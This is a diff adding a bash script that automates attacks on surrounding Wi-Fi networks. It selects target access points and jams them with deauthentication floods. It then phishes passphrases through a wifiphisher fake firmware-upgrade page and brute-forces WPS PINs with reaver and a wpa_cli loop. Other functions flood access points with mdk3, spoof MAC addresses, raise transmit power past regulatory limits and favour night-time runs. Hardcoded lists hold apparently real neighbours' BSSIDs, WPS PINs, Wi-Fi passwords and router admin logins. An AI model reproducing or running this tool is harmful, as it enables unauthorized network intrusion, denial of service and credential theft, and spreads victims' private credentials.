@@ -1,0 +1,1199 @@
+#!/bin/bash
+setvarb() {
+userid=$(awk -F: '!/root/ && /(\/bin\/bash)/ {print $1}' /etc/passwd)
+#wlinterface=$(awk '/wifi/ {printf $1}' <<< "$(nmcli d)")
+wlinterface=$(awk '!/mon/ && $1=="Interface" {printf $2}' <<< "$(iw dev)")
+moninterface="mon0"
+wpasupp="/etc/wpa_supplicant.conf"
+userhomedir="/home/$userid"
+echo "I am $userid"
+popfn=""
+startno="0"
+
+wpscript="./2wpcommand"
+extfunc="./functorun"
+
+#2wpcommand
+#wptooldir="$userhomedir/Documents/Docs/Linux/Kali/Tools"
+#wptooldir="$userhomedir/Documents/Docs/mlinuxproject/wltools/wptools"
+wptooldir="./wptools"
+wp12dir="$wptooldir/wifiphisher-1.2"
+wp12r2dir="$wptooldir/wifiphisher-1.2r2"
+jaminterface=${wlinterface}mon3
+macchanging="off"
+jammode=2
+stopaftertime=180
+#extfunc2="./funcsh"
+wptargnotes="./wptargnotes"
+
+#4wpspintext
+mc=on
+ssidlog="./wps$ssid"
+wpscript="./2wpcommand"
+extfunc2="./func"
+
+#4connectwifikey
+#| head -2 | tail -1)
+#nmcli c
+#nmcli d wifi list
+}
+setvarb
+
+#awk '/^cleanaplist\(\)\ \{/,/^}/' 2wpcommand
+#sed -n "/^$1()/,/^}/p" $wpscript | tee $extfunc
+#sed -rn "/(^cleanaplist\(\)\ \{)/,/^}/p" ./2wpcommand
+#perl -0777 -ne 'print $1 if /(cleanaplist\(\)\ \{.*?[}])/s' ./2wpcommand
+#a=cleanaplist
+#wpscript=./2wpcommand
+#extfunc=./func.sh
+#
+#perl -0777 -ne 'print $1 if /('$1'\(\)\ [{].*?\n[}])/s' $wpscript | tee $extfunc
+#source $copiedto
+sourcefn() {
+fntoadd=$1
+refscript=$2
+copiedto=$3
+sed -rn "/(^$1\(\)[ ][{])/,/^}/p" $refscript | tee -a $copiedto
+return 0
+}
+
+sourcescript() {
+fntoadd=$1
+refscript=$2
+copiedto=$3
+echo '#!/bin/bash' | tee "$copiedto"
+sourcefn "(setvarb|sourcefn|sourcescript)" "./3callwlfunction" "$copiedto"
+#sed -rn "/(^\#\#\#$1/,/^\#\#\#$1}/p" $refscript | tee -a $copiedto
+sed -rn '/###'$1'/,/###'$1'/p' $refscript | tee -a "$copiedto"
+#echo "setvarb" | tee -a $copiedto
+return 0
+}
+
+createextsc() {
+echo "#!/bin/bash" | tee $extfunc
+sourcefn "(setvarb|sourcefn|sourcescript)" "$0" "$extfunc"
+echo "setvarb" | tee -a "$extfunc"
+sudo chmod +x $extfunc
+}
+
+exitfn() {
+trap SIGINT
+echo "I am $userid"
+#sudo killall python2 ;
+sudo killall 2wpcommand ;
+sudo killall xterm ;
+sudo killall wifiphisher ;
+sudo killall aircrack-ng ;
+runrestartwlinterfacesc
+echo "exitting"
+sleep 1
+exit
+return 0
+}
+
+runcinroot() {
+sudo sh -c "$1"
+return 0
+}
+
+oldgmrold() {
+echo "I am $userid"
+sudo chmod +x $wpscript ;\
+trap "exitfn" INT
+cinroot=$(cat <<EOF
+gnome-terminal -e "$wpscript"
+EOF
+)
+runcinroot "$cinroot"
+while true ; do sleep 3600 ; done
+trap SIGINT
+return 0
+}
+
+getmacrv9() {
+echo "I am $userid"
+sourcescript "2wpcommand" "./3callwlfunction" "$wpscript"
+echo "wpcommand2" | tee -a "$wpscript"
+#sleep 6000
+sudo chmod +x $wpscript ;\
+trap "exitfn" INT
+cinroot=$(cat <<EOF
+gnome-terminal -e "sudo $wpscript"
+EOF
+)
+runcinroot "$cinroot"
+while true ; do sleep 3600 ; done
+trap SIGINT
+return 0
+}
+
+creategmrscold() {
+callscript="./3callwlfunction"
+#setvarb|exitfn|runcinroot|sourcefn|sourcescript|
+rm -f $extfunc
+echo '#!/bin/bash' | tee $extfunc
+sourcefn "(setvarb|exitfn|runcinroot|sourcefn|sourcescript|getmacrv9)" $callscript $extfunc
+echo "setvarb" | tee -a $extfunc
+echo "getmacrv9" | tee -a $extfunc
+sudo chmod +x $extfunc
+return 0
+}
+
+creategmrsc() {
+callscript="./3callwlfunction"
+#setvarb|exitfn|runcinroot|sourcefn|sourcescript|
+rm -f $extfunc
+echo '#!/bin/bash' | tee $extfunc
+sourcescript "2wpcommand" "$0" "$extfunc"
+sourcefn "(setvarb|exitfn|runcinroot|sourcefn|sourcescript)" "$0" "$extfunc"
+echo "
+trap \"exitfn\" INT
+setvarb
+wpcommand2
+trap SIGINT" | tee -a $extfunc
+sudo chmod +x $extfunc
+return 0
+}
+
+###2wpcommand
+wpcommand2() {
+setvarb
+
+installaircrackng() {
+#sudo add-apt-repository -y "" ;
+sudo apt-get install -y aircrack-ng ;
+return 0
+}
+
+installwifiphisher() {
+link=""
+outputdir=""
+wget 
+return 0
+}
+
+linkdir() {
+linkdircommand=$(cat <<EOF
+oridir="$userhomedir/Documents/Docs/Linux/Kali/Tools" &&\
+destdir="$userhomedir/Documents/Docs/mlinuxproject/wltools/wptools" &&\
+ln -sd $oridir/wifiphisher-1.2 $destdir/wifiphisher-1.2 &&\
+ln -sd $oridir/wifiphisher-1.2r2 $destdir/wifiphisher-1.2r2 &&
+EOF
+)
+sh -c "$linkdircommand"
+}
+
+#forfin resultltr
+#forfinarray resultutd
+cleanaplist() {
+sourcedir1="$userhomedir/Documents/Docs/mlinuxproject/wltools"
+file=$(find $sourcedir1 -mindepth 1 -maxdepth 1 -printf '%f\n' | sed -e 's,^./,,' -e 's, ,ws,' -e 's,Hufflepuff.Common.Room,HufflepuffwsCommonwsRoom,' | tr '\n' ' ' )
+filec=$(echo $file | wc -w)
+echo $filec
+
+comparecount=0
+for f in $file ; do
+if [[ -f "$sourcedir1/$f"  ]] && [[ $f =~ (APs)(.txt-)(..)(.cap|.kismet|.csv) ]] ; then
+comparecount=$[$comparecount+1]
+echo "delete $f"
+#sleep 100
+sudo rm -rf "$sourcedir1/$f"
+fi
+done
+echo "$comparecount"
+return 0
+}
+
+runrestartwlinterfacesc() {
+echo "#!/bin/bash" | tee $extfunc2
+sourcefn "setvarb" $0 $extfunc2
+echo "setvarb" | tee -a $extfunc2
+sourcefn "restartwlinterface" $0 $extfunc2
+echo "
+whoami
+restartwlinterface" | tee -a $extfunc2
+sudo chmod +x $extfunc2
+echo "$(whoami)"
+curdir="$(pwd)"
+#xterm -e "sudo -H -u $userid bash -c 'bash $curdir/func'"
+xterm -e "$curdir/func"
+}
+restartwlinterface() {
+echo "$userid"
+echo "$wlinterface"
+sudo wpa_cli terminate ;
+sudo killall python2 \
+aircrack-ng \
+wifiphisher \
+dhclient \
+wpa_supplicant \
+NetworkManager ;\
+#avahi-daemon
+sudo airmon-ng stop mon0 ;\
+sudo airmon-ng check kill ;\
+allmon=($(awk '/mon/ {printf $1}' <<< "$(ifconfig)"))
+if [[ -n $allmon ]] ; then
+for f in ${#allmon[@]} ; do
+sudo iw dev ${allmon[$[f]-1]} del
+done
+fi
+#sudo iw dev $wlinterface del ;\
+sudo ifconfig $wlinterface down ;\
+sudo ifconfig $wlinterface up ;\
+sudo modprobe b43 -r ;\
+sudo modprobe b43 ;\
+sleep 1
+#rfkill unblock wlan wifi ;\
+#sudo service network-manager restart ;\
+sudo systemctl restart NetworkManager
+sudo killall nm-applet ;\
+nohup nm-applet &
+sleep 3
+return 0
+}
+
+su - user <<EOF
+whoami
+nohup nm-applet &
+EOF
+
+listallw() {
+sudo killall python2 ;
+runrestartwlinterfacesc
+cleanaplist
+sleep 5
+sudo airmon-ng stop mon0 ; 
+sudo airmon-ng start wlp3s0b1 ;
+mode=1
+bssid=$(awk '/\#\#/ {print $2}' $wptargnotes)
+echo $bssid
+if [ "$mode" -eq "1" ]; then
+xterm -ls -xrm 'XTerm*selectToClipboard: true' -hold -e "sudo airodump-ng mon0 -w APs.txt"
+elif [ "$mode" -eq "2" ]; then
+xterm -ls -xrm 'XTerm*selectToClipboard: true' -hold -e "sudo airodump-ng mon0 --bssid \"$bssid\" -w APs.txt"
+fi
+sleep 1
+}
+
+jammode() {
+if [[ $jammode -eq 1 ]]
+then
+jamx=2
+jaminterval=4
+elif [[ $jammode -eq 2 ]]
+then
+jamx=10
+jaminterval=20
+fi
+return 0
+}
+
+prepare1() {
+sudo killall xterm ;
+sudo killall python2 ;
+sudo killall wifiphisher ;
+runrestartwlinterfacesc
+return 0
+}
+
+checktime() {
+hournow=$(date +%H)
+if [ $hournow -gt 18 -o $hournow -lt 8 ]
+then
+echo "Perfect time"
+else
+echo "$hournow Not the perfect time, should we carry on?"
+read -t 3 -p "y/n? " cont
+cont=${cont:-y}
+if [ $cont == "n" ]
+then
+exit
+fi
+fi
+return 0
+}
+
+changemac() {
+bssidmc="C0:25:E9:BD:3D:8B"
+#MBP="e4:ce:8f:32:a5:86"
+#SP3="04"
+#macchanging="on"
+sudo airmon-ng stop mon0 "$wlinterface"mon0 ;
+if [[ $macchanging =~ (on) ]]
+then
+sudo ifconfig $wlinterface down
+sleep 1
+sudo macchanger -m $bssidmc $wlinterface
+sleep 1
+sudo ifconfig $wlinterface up
+fi
+return 0
+}
+#cat APs.txt-01.kismet.csv | sort -r -k22 -n | awk -F';' '{print $22}'
+#cat APs.txt-01.kismet.csv | sort -t';' -r -k22 -n | awk -F';' '{print $14"\t"$22"\t"$4"\t"$6"\t"$3}'
+#cat APs.txt-01.csv | sort -t',' -r -k9,9 -k11,11 -n | awk -F',' '{print $11"\t"$9"\t"$1"\t"$4"\t"$14}'
+#cat APs.txt-01.csv | sort -t',' -r -k11,11 -k9,9 -n | awk -F',' '{print $11"\t"$9"\t"$1"\t"$4"\t"$14}'
+#sed -r '/VostroNet|Telstra\ Air|BelongKM7KJGQH|OPTUS_A33E22|Fon\ WiFi|504|PATYAYA|RTA|Ester|(-)[7-9][0-9]/d' ./APs.txt-01.csv | awk -F',' '{print $11"\t"$9"\t"$1"\t"$4"\t"$14}'
+setwi() {
+if [[ $automode =~ (y) ]] ; then
+sudo killall xterm ;
+listallw &
+sleep 60
+until [[ -n $topwl && -n $essid && -n $channel ]] ; do
+#topwl=$(cat APs.txt-01.csv | sed -r '/VostroNet|Telstra\ Air|BelongKM7KJGQH|OPTUS_A33E22|Fon\ WiFi|504|PATYAYA|RTA|Ester|(-)[7-9][0-9]/d' | sort -t',' -r -k11,11 -k9,9 -n | awk -F',' '{print $11"\t"$9"\t"$1"\t"$4"\t"$14}' | sed -n 1p)
+avoidssid="(MAC|VostroNet|Telstra[[:space:]]Air|ZTE|BelongKM7KJGQH|OPTUS_A33E22|Fon[[:space:]]Wifi|504|PATYAYA|RTA|Ester|David[[:space:]]Zhu|Bad[[:space:]]Dragon|[-][7-9][0-9])"
+topwl=$(awk -F"," 'NR==FNR{if (/MAC/) hit=NR} !/'$avoidssid'/ && NR>2{print $11";;"$9";;"$1";;"$4";;"$14} FNR==hit{exit}' ./APs.txt-01.csv | sort -t',' -r -k11,11 -k9,9 -n | sed -n 1p)
+#awk 'NR==FNR{if (/MAC/) hit=NR; next} {print} FNR==hit{exit}' ./APs.txt-01.csv
+essid=$(awk -F";;" '{gsub(/(^[ ]*)/,"",$5);printf $5}' <<< "$topwl")
+bssid=$(awk -F";;" '{printf $3}' <<< "$topwl")
+channel=$(awk -F";;" '{gsub(/ /,"",$4);printf $4}' <<< "$topwl")
+echo "searching..."
+sleep 2
+done
+sudo killall xterm ;
+datenow=$(date)
+echo "$datenow ; $essid $channel" | tee -a $wptargnotes
+
+else
+listallw &
+sleep 60
+sudo killall xterm ;
+essid=$(awk '/\#\#/ {printf $12}' $wptargnotes)
+bssid=$(awk '/\#\#/ {printf $2}' $wptargnotes)
+
+a=0
+until [[ $channel ]] ; do
+getchannel
+echo "checkchannelagain"
+sleep 5
+if [[ $a -gt 4 ]] ; then
+sleep 10
+essid=$(awk '/\#1\#/ {printf $12}' $wptargnotes)
+bssid=$(awk '/\#1\#/ {printf $2}' $wptargnotes)
+getchannel
+fi
+((a++))
+done
+
+fi
+
+return 0
+}
+
+getchannel() {
+channel=$(awk '/'$bssid'/ {printf $1}' <<< "$(nmcli -f CHAN,BSSID,ACTIVE dev wifi list)")
+return 0
+}
+
+jam() {
+xterm -hold -e "i=0 ; while true ; do sudo aireplay-ng -q 15 -0 \"$jamx\" -a \"$bssid\" ${wlinterface}mon4 --ignore-negative-one ; sleep $jaminterval ; ((i++)) ; done" &
+return 0
+}
+
+
+runwp() {
+if [ -z "$channel" ] ; then
+sudo $wp12dir/bin/wifiphisher -nJ -e "$essid" -p "firmware-upgrade"
+sleep 1
+xterm -hold -e "sudo $wp12dir/bin/wifiphisher -nJ -e \"$essid\" -p firmware-upgrade" &
+else
+sudo $wp12r2dir/bin/wifiphisher -nJ -e "$essid" -ch "$channel" -p "firmware-upgrade"
+sleep 1
+xterm -hold -e "sudo $wp12r2dir/bin/wifiphisher -nJ -e \"$essid\" -ch \"$channel\" -p firmware-upgrade" &
+#-pK s3cretpassword
+fi
+return 0
+}
+
+
+runjamnwp() {
+read -t 3 -i "y" -p "auto?(y/n)" automode
+automode=${automode:-y}
+echo $automode
+
+echo "I am g$(whoami)"
+jammode
+while true ; do
+sleep 3
+checktime
+setwi
+prepare1
+sleep 3
+echo "$essid"
+echo "$bssid"
+echo "$channel"
+echo "jammode=$jammode"
+changemac
+
+
+runwp
+echo "$jaminterface"
+sleep 15
+a=0
+while true ; do 
+if [[ -n $(grep "$jaminterface" <<< "$(iwconfig)") ]] ; then
+sleep 1
+xterm -hold -e "sudo airodump-ng \"$jaminterface\" --bssid \"$bssid\" --channel \"$channel\" -w \"$wp12r2dir/wifiphisher/handshakes/$essid\" " &
+sleep 5
+jam
+sleep $stopaftertime
+checkcapfile "$essid"
+break
+fi
+if [[ $a -gt 50 ]] ; then
+break
+fi
+echo "check again"
+((a++))
+sleep 2
+done
+
+done
+}
+
+checkcapfile() {
+./cleanup/cleanhsap
+ap="$1"
+passdir="$wp12r2dir/wifiphisher/password.txt"
+sourcedir1="$wp12r2dir/wifiphisher/handshakes"
+file=$(find $sourcedir1 -mindepth 1 -maxdepth 1 -printf '%f\n' | awk '/.cap/ && /'$ap'/ {print}' | sed -e 's,^./,,' -e 's, ,ws,' | tr '\n' ' ')
+
+for f in $file
+do
+checkcap=$(grep "success" <<< "$(sudo aircrack-ng -w $passdir $f)")
+if [[ ! -z $checkcap ]]
+then
+echo "found" | tee -a $wptargnotes
+else
+echo "not found on $f"
+fi
+
+done
+}
+
+boostwlinterface() {
+sudo ifconfig $wlinterface down
+sudo ip address flush $wlinterface &&\
+sudo iw reg set BO
+# optional to boost power FOR awuso36h
+sleep 1
+sudo ifconfig $wlinterface up
+sudo iwconfig $wlinterface channel 13
+sudo iwconfig $wlinterface txpower 30
+sudo iwconfig $wlinterface rate 1M
+}
+
+boostwlinterface
+runjamnwp
+}
+###2wpcommand
+
+###4wpspintext
+wpspintext() {
+#bssidmc="e4:ce:8f:32:a5:86"
+downgradereaverlibpcap() {
+return 0
+}
+recheckpin() {
+if [[ $mc =~ (on) ]] ; then
+mcommand="-m $bssidmc"
+fi
+nmcli d disconnect $wlinterface
+gnome-terminal -e "sudo reaver -i $moninterface -b $bssid -p $wpspin $mcommand && sleep 200"
+} 
+retestwhitespace() {
+bssidpin=$(cat <<EOF
+F4:6B:EF:90:A3:21;;BelongKM7KJGQH;;4H3GYXTKYR;;43357017
+9C:D3:6D:A5:FE:A0;;null;;nf;;08786241
+C8:51:95:50:F2:E4;;null;;nf;;53050601
+B8:08:D7:31:04:C0;;null;;nf;;32124804
+50:04:B8:62:2E:F4;;ZENG;;nf;;64345482
+C8:51:95:52:F1:CC;;JnTEPTY;;nf;;64345482;;58:00:E3:E9:68:E5
+B8:08:D7:31:04:C0;;DODO-04B8;;nf;;;;A4:D1:8C:C9:61:60;D4:A3:3D:C3:C0:78
+78:C1:A7:27:C1:76;;ZTE_H268A27C176;;nf;;;58:00:E3:E9:68:E5
+C0:25:E9:D4:75:40;;ePlanet;;nf;;;1C:C6:3C:BD:64:02;74:C6:3B:48:1C:50
+9C:3D:CF:FE:2D:DC;;David Zhu;;nf;;;
+A4:B1:E9:79:A0:11;;Telstra79A011;;nf;;;
+C0:25:E9:BD:3D:8B;;Bad Dragons (2.4GHz);;nf;;;
+A0:63:91:72:6B:F4;;NETGEAR49;;nf;;;
+A0:63:91:92:FB:04;;NETGEAR94;;nf;;;
+F8:D1:11:94:70:3A;;mrmotomaox;;nf;;;
+10:FE:ED:4C:DD:B0;;moto_tp_link;;nf;;;
+54:E6:FC:C4:93:FE;;netgear304;;nf;;;
+C8:51:95:50:F2:E4;;TPG-X898;;nf;;;
+EOF
+)
+#bssidpinarray=($(awk -F";;" '{printf "%s\n",$2; $2=""; print $2}' <<< "$bssidpin"))
+bssidpinarray=($(awk -F";;" '{printf("%s\n",$2)}' <<< "$bssidpin"))
+for f in ${!bssidpinarray[@]}; do
+echo $[$f+1]".${bssidpinarray[f]}"
+done
+return 0
+}
+
+
+bssidpin=$(cat <<EOF
+F4:6B:EF:90:A3:21;;BelongKM7KJGQH;;4H3GYXTKYR;;43117475;;43357017
+68:15:90:A3:3E:23;;OPTUS_A33E22;;carine@339204;;75748654;;89335260;;;;
+9C:D3:6D:A5:FE:A0;;null;;nf;;08786241
+C8:51:95:50:F2:E4;;null;;nf;;53050601
+B8:08:D7:31:04:C0;;null;;nf;;32124804
+50:04:B8:62:2E:F4;;ZENG;;nf;;64345482
+C8:51:95:52:F1:CC;;JnTEPTY;;nf;;64345482;;58:00:E3:E9:68:E5
+B8:08:D7:31:04:C0;;DODO-04B8;;nf;;;;A4:D1:8C:C9:61:60;D4:A3:3D:C3:C0:78
+78:C1:A7:27:C1:76;;ZTE_H268A27C176;;nf;;;58:00:E3:E9:68:E5
+C0:25:E9:D4:75:40;;ePlanet;;nf;;;1C:C6:3C:BD:64:02;74:C6:3B:48:1C:50
+9C:3D:CF:FE:2D:DC;;David\wsZhu;;nf;;;
+A4:B1:E9:79:A0:11;;Telstra79A011;;nf;;;
+C0:25:E9:BD:3D:8B;;Bad\wsDragons\ws(2.4GHz);;nf;;;
+A0:63:91:72:6B:F4;;NETGEAR49;;nf;;;
+A0:63:91:92:FB:04;;NETGEAR94;;nf;;;
+F8:D1:11:94:70:3A;;mrmotomaox;;nf;;;
+10:FE:ED:4C:DD:B0;;moto_tp_link;;nf;;;
+54:E6:FC:C4:93:FE;;netgear304;;nf;;;
+C8:51:95:50:F2:E4;;TPG-X898;;nf;;;
+EOF
+)
+
+listbssid() {
+#sudo wash -i mon0
+#sudo airodump-ng $moninterface
+#sudo bully $moninterface -b $bssid -v3
+bssidpinarray=($(awk -F";;" '{printf("%s\n",$2)}' <<< "$bssidpin"))
+echo "$1"
+for f in ${!bssidpinarray[@]}; do
+echo $[$f+1]".${bssidpinarray[f]}"
+done
+return 0
+}
+
+choosebssid() {
+whichbssid=$1
+bssid=$(awk -F";;" 'NR=='$whichbssid'{printf $1}' <<< "$bssidpin")
+ssid=$(awk -F";;" 'NR=='$whichbssid'{printf $2}' <<< "$bssidpin")
+wpspin=$(awk -F";;" 'NR=='$whichbssid'{printf $4}' <<< "$bssidpin")
+clientmac=$(awk -F";;" 'NR=='$whichbssid'{printf $6}' <<< "$bssidpin")
+savedpintorestart=$(awk -F";;" 'NR=='$whichbssid'{printf $5}' <<< "$bssidpin")
+key="random1234567890"
+#bssidmc="C2:25:E9:BD:3D:8B"
+bssidmc="$clientmac"
+echo "$ssid chosen!"
+return 0
+}
+
+startreaverway() {
+sudo airmon-ng stop mon0 "$wlinterface"mon0 ;
+if [[ $mc =~ (on) ]]
+then
+sudo ifconfig $wlinterface down
+sudo ifconfig $wlinterface hw ether $bssidmc
+sleep 1
+sudo ip address flush $wlinterface &&\
+sudo macchanger -m $bssidmc $wlinterface
+boostwlinterface
+fi
+sudo airmon-ng start $wlinterface &&\
+sudo ifconfig $moninterface down
+sudo macchanger -m $bssidmc $moninterface
+sudo ifconfig $moninterface up
+\
+\
+sudo airodump-ng $moninterface --bssid $bssid &&\
+sudo aireplay-ng -0 20 -a $bssid $moninterface --ignore-negative-one &&\
+\
+sudo systemctl restart NetworkManager &&\
+nohup nm-applet & disown &&\
+sleep 2 &&\
+##reconnect
+nmcli d disconnect $wlinterface &&\
+nmcli d wifi connect "$ssid" password "$key" iface $wlinterface &&\
+sleep 2 &&\
+nmcli d disconnect $wlinterface &&\
+nmcli d wifi connect "$ssid" password "$key" iface $wlinterface &&\
+echo Y | sudo reaver -i $moninterface -b $bssid -vv -m $bssidmc
+return 0
+}
+
+###TEST
+setvarb
+
+boostwlinterface() {
+sudo ifconfig $wlinterface down
+sudo ip address flush $wlinterface &&\
+sudo iw reg set BO
+# optional to boost power FOR awuso36h
+sleep 1
+sudo ifconfig $wlinterface up
+sudo iwconfig $wlinterface channel 13
+sudo iwconfig $wlinterface txpower 30
+sudo iwconfig $wlinterface rate 1M
+}
+
+test() {
+setvarb
+if [[ ! -f $ssidlog ]] ; then
+touch $ssidlog
+fi
+savedpintorestart=$(awk -F";;" 'END{printf $2}' $ssidlog)
+#savedpintorestart=43100000
+#savedpintorestart=89330000
+if [[ -z $savedpintorestart ]] ; then
+startfromno=10000000
+else
+startfromno=$savedpintorestart
+fi
+startfromno=$[75748654-30]
+startfromno=$[$wpspin-30]
+echo "$startfromno"
+
+#43117475;;43357017
+#for ((a=43117473;a<=44000000;a++)) ; do
+#for ((a=89335258;a<=89335260;a++)) ; do
+for ((a=$startfromno;a<=99999999;a++)) ; do
+echo "$wlinterface;;$ssid;;$bssid;;$a;;$wpspin"
+askforkeyfromwps $a
+detectpsk=$(awk '/ssid=/ {print}' $wpasupp)
+if [[ -n $detectpsk ]] ; then
+sudo wpa_cli terminate
+runrestartwlinterfacesc
+cat $wpasupp
+echo "GOTIT"
+return 0
+else
+echo "try again"
+fi
+done
+return 0
+}
+
+test4() {
+setvarb
+askforkeyfromwps $wpspin
+#wlinterface=wlp3s0b1
+#moninterface=mon0
+#bssid=68:15:90:A3:3E:23
+#ssid=OPTUS_A33E22
+#wpspin=75748654
+#sudo wpa_cli wps_reg 68:15:90:a3:3e:23 75748654
+#http://admin:Belong@10.0.0.138
+}
+
+checkreaver() {
+sudo airmon-ng start $wlinterface && sudo reaver -i $moninterface -b $bssid -p $wpspin -vv
+}
+
+
+checkwpslock() {
+washresultf="./washresult"
+sudo airmon-ng start $wlinterface
+sudo wash -i $moninterface -o "$washresultf" &
+wpslockstate=$(grep $ssid "$washresultf")
+until [[ -n "$wpslockstate" ]] ; do wpslockstate=$(grep $ssid $washresultf) ; done
+sudo killall wash ;
+echo "$(date);;$wpslockstate" | tee -a "$ssidlog"
+sudo rm -f "$washresultf" ;
+sudo airmon-ng stop $moninterface
+}
+
+checkwpslock2() {
+washresultf="./washresult"
+#sudo airmon-ng start $wlinterface
+sudo wash -i $moninterface -o "$washresultf" &
+wpslockstate=$(grep $ssid "$washresultf")
+until [[ -n "$wpslockstate" ]] ; do wpslockstate=$(grep $ssid $washresultf) ; done
+sudo killall wash ;
+echo "$(date);;$wpslockstate" | tee -a "$ssidlog"
+sudo rm -f "$washresultf" ;
+#sudo airmon-ng stop $moninterface
+}
+
+askforkeyfromwps() {
+#https://askubuntu.com/questions/120367/how-to-connect-to-wi-fi-ap-through-wps
+wpspin=$1
+$extfunc2
+sleep 3
+boostwlinterface
+checkwpslock
+echo "$wlinterface;;$ssid;;$bssid;;$wpspin"
+echo -e "ctrl_interface=/var/run/wpa_supplicant
+ctrl_interface_group=0
+update_config=1" | sudo tee $wpasupp
+sudo rm -f /var/run/wpa_supplicant/$wlinterface ;
+sudo wpa_supplicant -B -Dwext -i$wlinterface -c$wpasupp
+
+sudo wpa_cli status
+##wpa_state=INACTIVE
+sudo wpa_cli scan
+#bssidl=$bssid
+bssidl=$(awk '/'$ssid'/{printf $1}' <<< "$(sudo wpa_cli scan_result)")
+until [[ -n $bssidl ]] ; do bssidl=$(awk '/'$ssid'/{printf $1}' <<< "$(sudo wpa_cli scan_result)") && echo "checkingbssid" && sleep 2 ; done
+echo "$bssidl;;$wpspin"
+sudo wpa_cli wps_reg $bssidl $wpspin
+##OK
+#wait
+#CTRL-EVENT-CONNECTED
+#https://raspberrypi.stackexchange.com/questions/13895/solving-rtnetlink-answers-file-exists-when-running-ifup
+#sudo ip address flush $wlinterface
+timeout 60 sudo dhclient $wlinterface &
+sleep 60 && sudo killall dhclient ;
+sudo wpa_cli save
+cat $wpasupp
+echo "$(date);;$wpspin" | tee -a $ssidlog
+}
+
+###TEST
+
+listallfn() {
+#listfn=($(awk '/(^(recheckpin|startreaverway)\(\) {)/ {gsub("([(){])","");printf("%s\n",$0)}g' ./wpspintext))
+listfn=($(awk '/(^'$2'\(\) {)/ {gsub("([(){])","");print}' $3))
+totalallfn=${#listfn[@]}
+echo "$1"
+for f in ${!listfn[@]}; do
+echo $[$f+1]".${listfn[f]}"
+done
+read whichbssid fnno
+n=$[$fnno-1]
+fn="${listfn[$[$fnno-1]]}"
+echo "$n.$fn"
+
+choosebssid "$whichbssid"
+$fn
+
+sleep 1
+trap SIGINT
+return 0
+}
+
+letstry() {
+setvarb
+sudo airmon-ng start $wlinterface
+sudo mdk3 $moninterface a -a $bssid -m &
+sudo mdk3 $moninterface m -t $bssid &
+sudo mdk3 $moninterface d -b blacklist -c X &
+sudo mdk3 $moninterface b -t $bssid -c X &
+while true ; do checkwpslock2 && sleep 10 ; done &
+sleep 3600 && sudo killall mdk3 ;
+#wpslock immune to : macchanger;;timedelay;x:y;;
+}
+
+
+while true ; do
+listbssid "bssid"
+listallfn "allfn" "(recheckpin|startreaverway|test|test2|test3|test4|letstry)" $0
+#read mode
+done
+
+others=$(
+##mdk3flood
+timeout 30 sudo mdk3 $moninterface x 0 -t $bssid -n $ssid -s 100 &\
+timeout 30 sudo mdk3 $moninterface x 0 -t $bssid -n $ssid -s 100 &\
+timeout 30 sudo mdk3 $moninterface x 0 -t $bssid -n $ssid -s 100
+
+##https://forums.kali.org/showthread.php?19498-MDK3-Secret-Destruction-Mode
+mdk3 $moninterface a -a $bssid -m
+#This floods the target AP with fake clients.
+mdk3 $moninterface m -t $bssid
+#This causes Michael failure, stopping all wireless traffic. However, this only works if the target AP supports TKIP. (Can be AES+TKIP)
+mdk3 $moninterface d -b blacklist -c X
+#This keeps a continuous deauth on the network. If this attack does not start, make a blank text document in your root folder named blacklist. Leave it empty as MDK3 automatically populates the list.
+mdk3 $moninterface b -t $bssid -c X
+#This floods a bunch of fake APs to any clients in range (only effective to windows clients and maybe some other devices, Macs are protected against this).
+
+#You will know when the AP has reset either by checking with
+wash -i $moninterface
+#-C
+)
+
+message=$(cat <<EOF
+#https://briolidz.wordpress.com/2012/01/10/wi-fi-protected-setup-wps/
+#https://security.stackexchange.com/questions/147052/wps-output-messaging-translation-to-human-readable
+[+] Waiting for beacon from XX:XX:XX:... -> searching for Access Point
+[+] Associated with XX:XX:XX:... (ESSID: WifiTesting) -> Connected by radio
+[+] Trying pin 12345670 -> Testing PIN 
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message -> Router sends its identity / public key
+[+] Sending M2 message -> The client sends its identity / public key
+[+] Received M3 message
+[+] Sending M4 message
+[+] Received M5 message -> Confirmed, PIN1 is correct
+[+] Sending M6 message
+[+] Received M7 message -> Confirmed, PIN2 is correct
+[+] Sending WSC NACK -> The client closes communication because it's finished
+[+] Sending WSC NACK
+[+] Pin cracked in 7 seconds -> The program says the final complete PIN
+
+
+[!] WPS transaction failed (code: 0x02), re-trying last pin -> no response from AP, timeout
+[!] WPS transaction failed (code: 0x03), re-trying last pin -> incorrect packets order, no right answer, usually on M1 or M3
+[!] WPS transaction failed (code: 0x04), re-trying last pin -> AP doesn't want to speak with you :)
+EOF
+)
+}
+###4wpspintext
+###4connectwifikey
+connectwifikey() {
+setvarb
+
+ssidkey(){
+currentssid=$(awk 'NR==2{print $1}' <<< "$(nmcli c)")
+ssidkeylist=$(cat <<EOF
+OPTUS_A33E22;;carine@339204;;30425545;;192.168.0.1;;SGMcom;;3684;;778257@belong.com.au
+BelongKM7KJGQH;;4H3GYXTKYR;;43357017;;admin:Belong@10.0.0.138;;SGMcom;;4315U
+ZTE_H268A27C176;;notf
+Skynet;;Friday5411
+NETGEAR94;;Friday5411
+NetComm Wireless;;20172017
+504;;bruneidarussalam
+ALI RAYYAN;;21042014
+TGM;;JAKOJAKO
+vividwireless-F6D9;;notf
+RTA1025W-75F6E3;;339708swanston
+PATYAYA;;y1900a14
+Ester;;29061956aa
+EOF
+)
+#a=2
+listallssid=($(awk -F";;" '{printf("%s\n",$1)}' <<< "$ssidkeylist"))
+a=0
+for f in ${!listallssid[@]} ; do
+#num=$(echo $f + 1 | bc)
+echo $[$f+1]".${listallssid[f]}"
+((a++))
+done
+read chosenssid
+#ssid="${ssida[$a]}"
+#key="${keya[$a]}"
+#echo "$ssidkeylist" | sed -n "$a"p | 
+ssid=$(awk -F';;' 'NR='$chosenssid'{printf $1}' <<< $ssidkeylist)
+#bssid=$()
+key=$(awk -F';;' 'NR='$chosenssid'{printf $2}' <<< $ssidkeylist)
+wpspin=$(awk -F';;' 'NR='$chosenssid'{printf $3}' <<< $ssidkeylist)
+routerlogin=$(awk -F';;' 'NR='$chosenssid'{printf $4}' <<< $ssidkeylist)
+echo "$ssid; $key"
+}
+
+reconnect() {
+ssidkey
+nmcli d disconnect $wlinterface
+nmcli d wifi connect $ssid password $key iface $wlinterface
+#wpa_passphrase $ssid $key | sudo tee -a /etc/wpa_supplicant.conf
+#ip link set $wlinterface down
+#ip link set $wlinterface up
